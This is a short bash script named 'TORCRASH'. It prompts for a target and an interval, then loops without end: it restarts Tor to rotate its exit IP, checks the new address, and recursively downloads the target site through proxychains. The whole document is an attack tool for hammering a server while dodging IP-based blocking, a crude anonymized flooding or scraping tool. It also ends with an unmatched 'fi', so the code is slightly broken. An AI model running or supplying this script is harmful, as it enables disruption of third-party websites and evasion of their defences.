echo "////////////TORCRASH////////////";
echo "[REMEMER TO TOR-IZE PROXYCHAINS]";
echo "";
read -p "INPUT HOP TIME: " TIME;
read -p "INPUT TARGET: " TARGET;
sudo service tor start;
while true;
do sudo service tor reload;
sudo service tor restart; tput setaf 9;
proxychains curl ifconfig.me; tput sgr0;
proxychains wget -r  $TARGET; tput setaf 11;
date; tput sgr0;
echo "-----------------------";
sleep $TIME;
done
fi
